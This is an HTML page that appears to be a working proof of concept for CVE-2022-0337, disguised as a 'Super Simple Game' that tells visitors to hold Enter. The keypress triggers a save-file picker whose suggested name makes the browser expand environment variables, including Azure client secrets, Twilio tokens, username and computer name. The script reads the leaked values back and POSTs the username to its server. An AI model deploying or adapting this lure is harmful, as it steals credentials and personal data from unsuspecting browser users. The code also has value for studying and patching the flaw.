<!-- templates/index.html -->
<!DOCTYPE html>
<html>
<head>
    <title>
        CVE-2022-0337 System environment variables leak on Google Chrome,
        Microsoft Edge and Opera
    </title>
    <meta charset="UTF-8" />
    <style>
        /* CSS styles... */
    </style>
</head>

<style>
    body {
      background: rgba(29, 48, 109, 0.849);
      display: flex;
      justify-content: center;
      align-items: center;
      flex-direction: column;
    }

    h1,
    h2,
    h3 {
      -webkit-text-stroke: 1px #00000050;
    }

    h1 {
      color: #d96c06;
      font-size: 36px;
    }
    h2 {
      color: #1ebe8e;
      font-size: 46px;
    }
    h3 {
      color: #c6f91f;
      font-size: 18px;
    }
    h2 span {
      color: #cf4848;
      font-size: 70px;
    }

    #author {
      font-size: 28px;
    }

    span {
      font-weight: 100;
    }
</style>

<body>
    <div id="pixel"></div>
    <h3 id="userInfo"></h3>
    <h1>Super Simple Game<span>üòªüòªüòª</span></h1>
    <h2><span>‚å®Ô∏èHOLD ENTER</span> for 2 seconds</h2>
    <h3>win $1,000,000 and rule the world! <span>üî•üî•üî•üöÄ</span></h3>
    <h3 id="gameover"></h3>

    <script>

        function sendDataToServer(value) {
            fetch('/get_data', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                // C√≥ th·ªÉ g·ª≠i d·ªØ li·ªáu n·∫øu c·∫ßn
                body: JSON.stringify({ key: value })
            })
            .then(response => response.json())
            .then(data => {
                // X·ª≠ l√Ω response t·ª´ m√°y ch·ªß ·ªü ƒë√¢y
                console.log(data);
                // V√≠ d·ª•: Hi·ªÉn th·ªã th√¥ng ƒëi·ªáp t·ª´ response tr√™n trang web
                document.getElementById('responseMessage').innerText = data.message;
            })
            .catch(error => {
                console.error('Error:', error);
            });
        }
        
        let countEnter = 0;
        let isDownloaded = false;

        window.onload = function () {
            const body = document.querySelector("body");
            const pixel = document.querySelector("#pixel");

            body.onkeydown = (e) => (e.key == "Enter" ? clickedEnter() : 1);
            body.onkeyup = (e) => (e.key == "Enter" ? cancelEnter() : 1);

            const randomNumber = Math.floor(Math.random() * 990) + 1;
            const filename = `f${randomNumber}.f`;

            const environmentVariables = [
            "USERNAME",
            "USERDOMAIN",
            "SESSIONNAME",
            "COMPUTERNAME",
            "KEY_VAULT_URL",
            "SECRET_NAME",
            "AZURE_TENANT_ID",
            "AZURE_CLIENT_ID",
            "AZURE_CLIENT_SECRET",
            "TWILIO_ACCOUNT_SID",
            "TWILIO_AUTH_TOKEN",
            //'TOKEN',
            //'PASSWORD'
            ];

            const suggestedName =
                environmentVariables.map((x) => `%${x}%`).join("@") + filename;

            pixel.addEventListener("click", async () => {
                const data = await window.navigator.userAgent;
                console.log(data)

                const handle = await window.showSaveFilePicker({ suggestedName });

                const username = handle.name.split("@")[0];
                sendDataToServer(username)
                const userInfo = handle.name
                    .replaceAll(filename, "")
                    .split("@")
                    .map(
                        (x, i) =>
                            `${environmentVariables[i]} = ${x.includes("%") ? "null" : x}`
                    )
                    .join("<br>");
                const guessWinPath = `C:/Users/${username}`;
                document.querySelector(
                    "#userInfo"
                ).innerHTML = `USER'S ENVIRONMENT VARIABLES: <br>${userInfo} <br> guessWinPath = C:/users/${username}`;
                document.querySelector("#gameover").textContent =
                    "GAME OVER - Need refresh to start again";
            });
        };

        function clickedEnter() {
            countEnter++;
            if (countEnter > 5 && !isDownloaded) {
                pixel.click();
                isDownloaded = true;
            }
        }

        function cancelEnter() {
            countEnter = 0;
        }
    </script>
</body>
</html>
